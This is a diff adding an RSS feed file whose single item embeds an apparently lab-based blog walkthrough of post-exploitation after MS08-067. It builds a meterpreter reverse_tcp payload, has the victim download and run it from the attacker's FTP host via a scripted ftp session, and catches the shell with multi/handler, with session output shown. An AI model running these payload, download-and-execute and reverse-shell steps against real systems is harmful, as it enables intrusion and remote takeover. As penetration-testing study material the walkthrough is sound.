@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ftp on </title>
+    <link>/categories/ftp/</link>
+    <description>Recent content in Ftp on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Fri, 05 Jun 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/categories/ftp/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Meterpreter up and running post exploitation</title>
+      <link>/posts/2015-06-05-Meterpreter-Post-Exploitation/</link>
+      <pubDate>Fri, 05 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/2015-06-05-Meterpreter-Post-Exploitation/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;ve exploited MS08-067 without metasploit.  After exploitation I use metasploit&amp;rsquo;s meterpreter.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start the ftp service on my attacking machine&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;service pure-ftpd start
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Create a payload to connect back to my attacking machine&amp;rsquo;s listening meterpreter and save it to my ftp directory&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msfpayload windows/meterpreter/reverse_tcp lhost=192.168.30.36 lport=443 X &amp;gt; /ftphome/iambad.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Exploit MS08-067 refer to&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/&#34;&gt;http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  FTP is installed on the server.  FTP is not interactive, so create a text file to pass to the ftp application.  I issue the following commands.  &lt;em&gt;Note the lack of spaces after the echo command&lt;/em&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo open 192.168.30.36&amp;gt; ftp.txt
+echo your_username&amp;gt;&amp;gt; ftp.txt
+echo your_password&amp;gt;&amp;gt; ftp.txt
+echo binary&amp;gt;&amp;gt; ftp.txt
+echo get iambad.exe&amp;gt;&amp;gt; ftp.txt
+echo bye&amp;gt;&amp;gt; ftp.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Execute the ftp command passing the ftp.txt as a parameter&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ftp -s:ftp.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start msfconsole on attacking machine&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msfconsole
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start multi/handler, set LHOST, set LPORT, and start handler&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler
+msf exploit(handler) &amp;gt; set LHOST 192.168.30.36
+msf exploit(handler) &amp;gt; set LPORT 443
+msf exploit(handler) &amp;gt; run
+[*] Started reverse handler on 192.168.30.36:443 
+[*] Starting the payload handler...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Execute payload&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;iambad.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Meterpreter session obtained&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] Sending stage (770048 bytes) to 192.168.31.205
+[*] Meterpreter session 1 opened (192.168.30.36:443 -&amp;gt; 192.168.31.205:2707) at 2015-06-05 08:06:04 -0400
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
